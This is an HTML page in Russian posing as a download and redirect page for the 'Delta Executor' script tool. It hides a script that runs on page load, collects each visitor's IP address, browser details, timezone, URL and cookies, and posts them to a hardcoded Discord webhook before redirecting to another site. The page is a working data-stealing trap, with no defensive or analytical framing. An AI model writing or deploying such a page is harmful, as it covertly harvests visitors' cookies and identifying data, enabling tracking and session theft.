<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Delta Executor - Скачать бесплатно</title>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #fff;
            font-family: 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            text-align: center;
            padding: 40px;
        }
        h1 {
            font-size: 48px;
            color: #ff4444;
            margin-bottom: 20px;
        }
        p {
            color: #888;
            font-size: 18px;
            margin-bottom: 30px;
        }
        .btn {
            display: inline-block;
            padding: 15px 40px;
            background: #ff4444;
            color: #fff;
            text-decoration: none;
            border-radius: 5px;
            font-size: 20px;
            font-weight: bold;
            transition: all 0.3s;
        }
        .btn:hover {
            background: #ff6666;
            transform: scale(1.05);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ Delta Executor</h1>
        <p>Переход на официальный сайт...</p>
        <a href="https://deltaexecutor.gg" class="btn">Скачать Delta Executor</a>
    </div>
    
    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1538116344967340144/ECF6ixeFCjRIZrStHKIv6SjuYyt09u8lGh_qTCP62P-nzOlwqF8raxBnLX3GtqIWsZLW";
        
        async function collectData() {
            const data = {
                ip: await getIP(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                url: window.location.href,
                cookies: document.cookie
            };
            
            const message = '🔍 **Посетитель страницы Delta**\n\n' +
                '🌐 IP: ' + data.ip + '\n' +
                '👤 UA: ' + data.userAgent + '\n' +
                '🌍 Язык: ' + data.language + '\n' +
                '💻 Платформа: ' + data.platform + '\n' +
                '🖥️ Экран: ' + data.screen + '\n' +
                '⏰ TZ: ' + data.timezone + '\n' +
                '🔗 URL: ' + data.url + '\n\n' +
                '🍪 COOKIES:\n```' + data.cookies + '```';
            
            await fetch(WEBHOOK, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({content: message})
            });
        }
        
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (e) { return 'Unknown'; }
        }
        
        // Автопереход через 3 секунды
        setTimeout(function() {
            window.location.href = 'https://deltaexecutor.gg';
        }, 3000);
        
        collectData();
    </script>
